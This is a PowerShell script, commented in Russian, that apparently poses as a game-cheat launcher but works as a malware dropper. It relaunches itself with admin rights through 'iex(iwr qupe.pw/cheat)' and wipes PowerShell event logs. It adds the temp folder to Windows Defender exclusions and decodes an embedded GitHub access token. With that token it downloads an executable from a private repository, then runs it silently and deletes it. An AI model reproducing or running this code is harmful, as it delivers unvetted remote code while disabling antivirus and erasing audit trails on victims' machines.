function Ensure-RunAsAdmin {
    # Проверяем, запущен ли скрипт с правами администратора
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {
        Write-Host "Restart for admin privelegues"

        # Построение аргументов для повторного запуска
        $scriptPath = $MyInvocation.MyCommand.Definition
        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex( iwr qupe.pw/cheat)`""

        # Настройка параметров нового процесса
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = $arguments
        $psi.Verb = "runas" # Запуск с правами администратора

        # Перезапуск процесса
        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            Exit
        } catch {
            Write-Error "Ошибка запуска с правами администратора."
            Exit 1
        }
    } else {
        #Write-Host "Скрипт уже запущен с правами администратора." -ForegroundColor Green
    }
}

cls
# Пример использования функции
Ensure-RunAsAdmin

function Set-RegistryValue {
    param (
        [string]$Path = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main",
        [string]$Name = "DisableFirstRunCustomize",
        [int]$Value = 2
    )

    try {
        # Установка значения реестра
        Set-ItemProperty -Path $Path -Name $Name -Value $Value
        #Write-Host "Значение '$Name' успешно установлено на $Value." -ForegroundColor Green
    } catch {
        Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function ClrHistory {
    try {
        # Определяем версию Windows
        $windowsVersion = (Get-CimInstance Win32_OperatingSystem).Version
        $majorVersion = $windowsVersion.Split('.')[0]

        if ($majorVersion -lt 10) {
            # Для Windows 7 и 8
            if (Get-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue) {
                Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
            }
        } else {
            # Для Windows 10 и выше
            wevtutil clear-log "Windows PowerShell"
            wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
        }

        # Удаление истории команд PSReadLine
        $historyPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path $historyPath) {
            Remove-Item $historyPath -Force -ErrorAction Stop
        }

        # Удаление AppData PowerShell (необязательно, но на всякий случай)
        $powershellDir = Join-Path $env:AppData 'Microsoft\Windows\PowerShell'
        if (Test-Path $powershellDir) {
            Remove-Item $powershellDir -Recurse -Force -ErrorAction Stop
        }

        Write-Host "История PowerShell успешно очищена!" -ForegroundColor Green

    } catch {
        Write-Host "Ошибка очистки: $($_.Exception.Message)" -ForegroundColor Red
    }
}



Start-Sleep -s 1

try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
} catch {
    Write-Host "Error clean log, please restart for Administrator" -ForegroundColor Red
}

$temp = $env:TEMP

$systemPath = "$env:SystemRoot\System32";
$file1 = "$systemPath\msvcp140.dll";
$file2 = "$systemPath\vcruntime140_1.dll";
$file3 = "$systemPath\vcruntime140.dll";
$redistCheck = (Test-Path $file1) -and (Test-Path $file2) -and (Test-Path $file3);

try	{
	if (!$redistCheck)
	{
		$redistFilePath = "$temp\VC_redist.x64.exe"
		try
		{
			Remove-Item $redistFilePath -ErrorAction Ignore;
		}
		catch {}
		Write-Host "СКАЧИВАЕМ..." -ForegroundColor Green;
		try
		{
			Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile "$redistFilePath" -ErrorAction Ignore;
		} catch {
			Write-Host "Ошибка во время скачивания необходимых компонентов." -ForegroundColor Red;
		}
		Write-Host "УСТАНОВКА..." -ForegroundColor Green;
		try
		{
			Start-Process -FilePath $redistFilePath -ArgumentList "/repair", "/quiet", "/norestart" -Wait -ErrorAction Ignore;
			Remove-Item $redistFilePath -ErrorAction Ignore;
		} catch {
			Write-Host "Ошибка 1 во время установки необходимых компонентов. Попробуй запустить от администратора." -ForegroundColor Red;
		}
	}


    Write-Host "Download..." -ForegroundColor Green
    $contFile = [System.IO.Path]::GetTempFileName()
	try { Add-MpPreference -ExclusionPath $temp -ErrorAction Stop } catch {	}

    try {
		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
		$q = '"'
        $h = @{"Authorization" = "$String"}
        $response = Invoke-RestMethod 'https://api.github.com/repos/xsdementevx/launcher/contents/launcher_dll.exe' -Method 'GET' -Headers $h
		Invoke-WebRequest $response.download_url -OutFile $contFile
        if (Test-Path $contFile) {
			try {
				Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c `"$contFile`" && del `"$contFile`""
			} catch {
				Write-Host "Error Start-Process, please restart for Administrator" -ForegroundColor Red
				Start-Sleep -s 3
			}
        } else {
            Write-Host "Error, not file exist" -ForegroundColor Red
            Start-Sleep -s 3
        }
    } catch {
        Write-Host "Download and start not sucessed" -ForegroundColor Red
        Start-Sleep -s 3
    }


} finally {
	Set-RegistryValue
    #ClrHistory
}

exit
